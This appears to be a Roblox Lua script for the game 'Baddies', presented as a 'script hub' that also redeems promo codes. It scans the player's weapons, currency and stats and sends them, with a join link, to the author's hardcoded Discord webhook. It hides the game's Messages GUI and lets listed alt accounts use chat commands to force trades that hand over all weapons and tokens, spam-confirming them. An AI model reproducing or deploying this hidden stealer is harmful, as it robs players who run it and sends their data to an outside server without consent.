-- cee script hub | Baddies
-- NO blocking calls at top level. Everything in task.spawn + pcall.

local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService   = game:GetService("TextChatService")
local TweenService      = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local lp  = Players.LocalPlayer
local pg  = lp:WaitForChild("PlayerGui")

local MY_WEBHOOK   = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau","stopbanningmyaccs67","mantskeys55","jayisbodybuilt","mydignames6769"}
local PING_POOR    = (_G.PING_POOR ~= nil) and _G.PING_POOR or true

local PINK     = 0xFF69B4
local BOT_NAME = "cee script hub | Baddies"

-- ═══════════════════════════════════════════
--  HTTP  (tries every mobile method)
-- ═══════════════════════════════════════════
local function sendRequest(url, payload)
    if not url or url == "" or url == "PUTHERE" then return end
    local ok, body = pcall(function() return HttpService:JSONEncode(payload) end)
    if not ok then return end
    local h = {["Content-Type"] = "application/json"}
    local methods = {
        function() return request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return syn.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http.request({Url=url,Method="POST",Headers=h,Body=body}) end,
        function() return http_request({Url=url,Method="POST",Headers=h,Body=body}) end,
    }
    for _, m in ipairs(methods) do
        local s, r = pcall(m)
        if s and r then return r end
    end
end

-- ═══════════════════════════════════════════
--  TOOL SCANNER + CLASSIFIER
-- ═══════════════════════════════════════════
local BASE_PAT  = {"punch","wallet","phone","tradesign","spray","pan","candybag","noodle"}
local STYLE_PAT = {"mma","karate","boxing","capoeira","style","fighting","kung","judo","taekwondo","breakdance"}
local STOMP_PAT = {"stomp","slam"}
local RICH_WEAPONS = {
    {label="Spiked Kitty",          keys={"spiked kitty"}},
    {label="Glitter Bomb",          keys={"glitter bomb"}},
    {label="Glitter Blue Spray",    keys={"glitter blue"}},
    {label="Love Me Hate Me Taser", keys={"love me hate me","lmhm"}},
    {label="Spiked Knuckles (50%)", keys={"spiked knuckle"}},
    {label="Ice Katana (30%)",      keys={"ice katana"}},
}

local function scanTools()
    local all = {}
    local function scan(obj)
        if not obj then return end
        for _, v in ipairs(obj:GetChildren()) do
            if v:IsA("Tool") then table.insert(all, v.Name) end
        end
    end
    pcall(scan, lp:FindFirstChild("Backpack"))
    pcall(scan, lp.Character)
    pcall(scan, lp:FindFirstChild("StarterGear"))
    return all
end

local function classifyTools(all)
    local base, weapons, styles, stomps = {}, {}, {}, {}
    for _, name in ipairs(all) do
        local low = name:lower()
        local isBase, isStyle, isStomp = false, false, false
        for _, p in ipairs(BASE_PAT)  do if low:find(p,1,true) then isBase  = true; break end end
        for _, p in ipairs(STYLE_PAT) do if low:find(p,1,true) then isStyle = true; break end end
        for _, p in ipairs(STOMP_PAT) do if low:find(p,1,true) then isStomp = true; break end end
        if isStyle then      table.insert(styles,  name)
        elseif isStomp then  table.insert(stomps,  name)
        elseif isBase then   table.insert(base,    name)
        else                 table.insert(weapons, name) end
    end
    return base, weapons, styles, stomps
end

local function checkRich(all)
    local lines = {}
    for _, rw in ipairs(RICH_WEAPONS) do
        local found = false
        for _, t in ipairs(all) do
            local low = t:lower()
            for _, k in ipairs(rw.keys) do
                if low:find(k,1,true) then found = true; break end
            end
            if found then break end
        end
        table.insert(lines, rw.label..": "..(found and "true" or "false"))
    end
    return lines
end

local function fmtNum(n)
    if type(n) ~= "number" then return tostring(n) end
    if n >= 1e6 then return string.format("%.1fM", n/1e6)
    elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
    else return tostring(n) end
end

local function getExec()
    if getexecutorname then
        local ok, n = pcall(getexecutorname); if ok and n then return n end
    end
    if syn and syn.request then return "Synapse X" end
    if KRNL_LOADED         then return "Krnl" end
    if fluxus              then return "Fluxus" end
    if Delta               then return "Delta" end
    if Electron            then return "Electron" end
    return "Unknown Executor"
end

-- ═══════════════════════════════════════════
--  WEAPON LIST  (names for GUI click + hex IDs for direct add)
-- ═══════════════════════════════════════════
local WEAPON_NAMES = {
    "Parasol","SpikedPurse","Glitter Bomb","Spiked Kitty Stanli","Ice Katana",
    "Love Me Hate Me Taser","Glitter Blue Spray","Spiked Knuckles",
    "Grim Reaper Cloak","Blast Bow","Princess Power Style","Feral Frenzy Style",
    "Roller Skates","Storm Dancer Style","Hug of Doom Style","Hero Finisher",
    "Grim Reaper Finisher","Gun Finisher","Doom Finisher","Breakdance Finisher",
    "Celestial Scythes","Graveyard Grip Knuckles","Shadow Sorcery Purse",
    "Marshmallow Mixer Purse","Unicorn Brass Knuckles","Disco Dash Board",
    "Toast Hoverboard","Frost Stomp","Sniper Rifle RPG","Cursed Board",
    "Evil Goth Knuckles","Witchy Broom Board","Floating Leaf",
    "Shark Brass Knuckles","Ghostly RPG","404 Not Found Blade",
    "Vampire Flamethrower","Big Boom Hammer","Mallow Glide Board",
    "Mean Girl Mayhem Style","Karate Style","Kitty Purse","Freeze Gun",
    "Shiny Purse","Loveboard","Brass Knuckles","Golden Snowball Launcher",
    "Snowball Launcher","Sledge Hammer","Turkey Skewers","Fan of Requiem",
    "Chainsaw","Scythe","Trashbin Disguise","Crowbar","Harpoon",
    "Heartbreaker Style","Cannon","Spiked Nightmare Purse","Glitter Style",
    "Trident","Sakura Blade","Nunchucks","DogPurse","Champion Gloves",
    "Chain Mace","Graveyard Howl RPG","Mocha Missile Maker RPG",
    "Black Flame Stomp","Angelic Board","Credit Card Hoverboard",
    "Constellations RPG","Palm Sakura Blade","Popstar Hoverboard",
    "Pink Star Board","Thorned Romance","Mischief Stomp","Lava RPG",
    "Crushing Love","Love Bomb Finisher","Haunted Cemetery RPG",
    "Cyber Samurai RPG","Black Flame Knuckles","Vanity Vortex Finisher",
    "Egg Rocket Launcher","Frostwind Glider Board","Sakura Finisher",
    "The Doom Knuckles","Flintlock","Pinata Purse","Cutlass Sakura Blade",
    "Police Hoverboard","Vampire Brass Knuckles","Dual Shadow of Night Blade",
    "Dance Bomb","Queen Throne","Gravekeeper Charm","Surf Up Hoverboard",
    "Y&Y Board","Cupid Bow","Witch Wands Taser",
}

-- ═══════════════════════════════════════════
--  TASK 1 — WEBHOOK PING  (fires first, independent)
-- ═══════════════════════════════════════════
task.spawn(function()
    task.wait(2)

    local ok2 = pcall(function()
        local name   = lp.Name
        local all    = scanTools()
        local base, weapons, styles, stomps = classifyTools(all)
        local rich   = checkRich(all)
        local isRich = #weapons >= 3

        local ls   = lp:FindFirstChild("leaderstats")
        local din  = ls and ls:FindFirstChild("Dinero") and ls.Dinero.Value or "N/A"
        local sla  = ls and ls:FindFirstChild("Slays")  and ls.Slays.Value  or "N/A"

        local weapLines = {}
        for _, w in ipairs(weapons) do
            table.insert(weapLines, "1x "..w)
        end
        if #weapLines == 0 then table.insert(weapLines, "None") end

        local styleStr = #styles>0 and ("- "..table.concat(styles,"\n- ")) or "- None"
        local stompStr = #stomps>0 and ("- "..table.concat(stomps,"\n- ")) or "- None"

        local joinUrl  = "https://www.roblox.com/games/start?placeId="..
                         tostring(game.PlaceId).."&gameInstanceId="..
                         tostring(game.JobId)

        local embed = {
            color  = PINK,
            fields = {
                {name="User",     value=name,                              inline=true},
                {name="Dinero",   value=fmtNum(din),                       inline=true},
                {name="Slays",    value=fmtNum(sla),                       inline=true},
                {name="Executor", value=getExec(),                         inline=true},
                {name="Players",  value=#Players:GetPlayers().." / "..Players.MaxPlayers, inline=true},
                {name="Trade",    value="Tradable: "..#weapons.."  |  Untradable: "..#base, inline=true},
                {name="Rich Weapons",            value=table.concat(rich,"\n"),        inline=false},
                {name="Weapons",                 value=table.concat(weapLines,"\n"),   inline=false},
                {name="Skins & Fighting Styles", value="Fighting Styles:\n"..styleStr.."\n\nStomps:\n"..stompStr, inline=false},
                {name="Join Link", value="[Click to Join]("..joinUrl..")", inline=false},
            },
            footer    = {text=BOT_NAME.." | "..name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        }

        local content = name.." executed!"
        if isRich and PING_POOR then content = "@everyone @here RICH: "..name end

        if USER_WEBHOOK ~= "PUTHERE" then
            sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=content, embeds={embed}})
        end
        if isRich then
            sendRequest(MY_WEBHOOK, {username=BOT_NAME, content="@everyone RICH: "..name, embeds={embed}})
        end
    end)

    if not ok2 then
        -- Fallback: bare minimum ping even if embed building fails
        pcall(function()
            if USER_WEBHOOK ~= "PUTHERE" then
                sendRequest(USER_WEBHOOK, {username=BOT_NAME, content=lp.Name.." executed (fallback ping)"})
            end
        end)
    end
end)

-- ═══════════════════════════════════════════
--  TASK 2 — HIDE MESSAGES GUI
-- ═══════════════════════════════════════════
task.spawn(function()
    local function kill(g)
        if g.Name == "Messages" then pcall(function() g:Destroy() end) end
    end
    for _, g in ipairs(pg:GetChildren()) do kill(g) end
    pg.ChildAdded:Connect(kill)
    while true do
        task.wait(0.1)
        local m = pg:FindFirstChild("Messages")
        if m then pcall(function() m:Destroy() end) end
    end
end)

-- ═══════════════════════════════════════════
--  TASK 3 — TRADING (auto-add, 1/2 commands)
-- ═══════════════════════════════════════════
task.spawn(function()
    -- Fetch all remotes lazily inside pcall
    local Net, RFSend, REPhone, RFReady, RFConfirm, RFAccept, RFTokens

    pcall(function()
        Net      = ReplicatedStorage:WaitForChild("Modules", 8):WaitForChild("Net", 8)
        RFSend   = Net["RF/Trading/SendTradeOffer"]
        REPhone  = Net["RE/SetPhoneSettings"]
        RFReady  = Net["RF/Trading/SetReady"]
        RFConfirm= Net["RF/Trading/ConfirmTrade"]
        RFAccept = Net["RF/Trading/AcceptTradeOffer"]
        RFTokens = Net["RF/Trading/SetTokens"]
    end)

    -- Enable trading
    pcall(function() REPhone:FireServer("TradeEnabled", true) end)

    -- Show trade request panel
    pcall(function()
        pg:WaitForChild("TradeList", 8)
           :WaitForChild("Main", 5)
           :WaitForChild("TradeRequest", 5).Visible = true
    end)

    -- Click weapon buttons in the Trading GUI
    local function clickWeapons()
        local sf = nil
        pcall(function()
            sf = pg.Trading.Frame.Main.YourOffer.ItemDisplay.ScrollingFrame
        end)
        if not sf then return 0 end
        local added = 0
        for _ = 1, 5 do
            local n = 0
            for _, name in ipairs(WEAPON_NAMES) do
                local btn = sf:FindFirstChild(name)
                if btn and btn:IsA("ImageButton") and btn.Visible then
                    pcall(function() firesignal(btn.MouseButton1Click) end)
                    pcall(function()
                        local p, s = btn.AbsolutePosition, btn.AbsoluteSize
                        VirtualInputManager:SendMouseButtonEvent(p.X+s.X/2, p.Y+s.Y/2, 0, true, game, 0)
                        task.wait(0.04)
                        VirtualInputManager:SendMouseButtonEvent(p.X+s.X/2, p.Y+s.Y/2, 0, false, game, 0)
                    end)
                    n = n + 1; added = added + 1
                    task.wait(0.02)
                end
            end
            if n == 0 then break end
            task.wait(0.4)
        end
        return added
    end

    local function getTokens()
        local n = 0
        pcall(function()
            local tl = pg.Trading.Frame.Categories.TokenAmount.TextLabel
            n = tonumber(string.match(tl.Text, "%d+")) or 0
        end)
        return n
    end

    local function spamConfirm()
        for _ = 1, 20 do
            pcall(function() RFConfirm:InvokeServer() end)
            task.wait(0.05)
        end
    end

    local function doAdd()
        clickWeapons()
        local ta = getTokens()
        if ta and ta > 0 then pcall(function() RFTokens:InvokeServer(ta) end) end
        task.wait(0.5)
        pcall(function() RFReady:InvokeServer(true) end)
        task.wait(0.5)
        spamConfirm()
    end

    local isProcessing = false

    local function onChat(sender, txt)
        local isAlt = false
        for _, u in ipairs(MY_USERNAMES) do
            if sender.Name:lower() == u:lower() then isAlt = true; break end
        end
        if not isAlt then return end
        if isProcessing then return end
        isProcessing = true

        -- Send them a trade offer
        task.wait(0.2)
        pcall(function() RFSend:InvokeServer(sender) end)
        task.wait(0.3)

        if txt == "add" then
            doAdd()
        elseif txt == "1" then
            pcall(function() RFReady:InvokeServer(true) end)
        elseif txt == "2" then
            spamConfirm()
        end

        task.wait(0.5)
        isProcessing = false
    end

    -- Hook modern TextChatService
    pcall(function()
        TextChatService.OnIncomingMessage = function(msg)
            local ts = msg.TextSource
            if not ts then return end
            local s = Players:GetPlayerByUserId(ts.UserId)
            if s then
                task.delay(0.3, function()
                    onChat(s, tostring(msg.Text or ""):lower())
                end)
            end
        end
    end)

    -- Hook legacy Chatted
    local function hookPlayer(p)
        pcall(function()
            p.Chatted:Connect(function(msg)
                task.delay(0.3, function() onChat(p, msg:lower()) end)
            end)
        end)
    end
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= lp then hookPlayer(p) end
    end
    Players.PlayerAdded:Connect(hookPlayer)

    -- Auto-complete when an accepted trade offer comes from our alt
    task.spawn(function()
        while true do
            task.wait(0.5)
            pcall(function()
                -- Watch for incoming trade offers from our alts
                local tradingGui = pg:FindFirstChild("Trading")
                if tradingGui and tradingGui.Enabled then
                    local frame = tradingGui:FindFirstChild("Frame")
                    local theirOffer = frame and frame:FindFirstChild("Main")
                                       and frame.Main:FindFirstChild("TheirOffer")
                    if theirOffer then
                        -- Check if the trader is one of our alts
                        local traderName = ""
                        pcall(function()
                            traderName = frame.Main.TraderName.Text:lower()
                        end)
                        for _, u in ipairs(MY_USERNAMES) do
                            if traderName:find(u:lower(), 1, true) then
                                task.wait(1)
                                doAdd()
                                break
                            end
                        end
                    end
                end
            end)
        end
    end)

    -- Auto-redeem codes
    task.spawn(function()
        task.wait(3)
        local CODES = {
            "BADDIES","BADDIES2024","BADDIES2025","FREE","FREEMONEY",
            "RELEASE","LAUNCH","UPDATE","NEWUPDATE","1MILLION",
            "500K","100K","SORRY","FIXEDUPDATE","HOLIDAY","SPRING","SUMMER",
        }
        local redeemRemote = nil
        pcall(function()
            for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
                local low = v.Name:lower()
                if low:find("code",1,true) and
                   (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
                    redeemRemote = v; break
                end
            end
        end)
        if redeemRemote then
            for _, code in ipairs(CODES) do
                pcall(function()
                    if redeemRemote:IsA("RemoteFunction") then
                        redeemRemote:InvokeServer(code)
                    else
                        redeemRemote:FireServer(code)
                    end
                end)
                task.wait(0.3)
            end
        end
    end)
end)
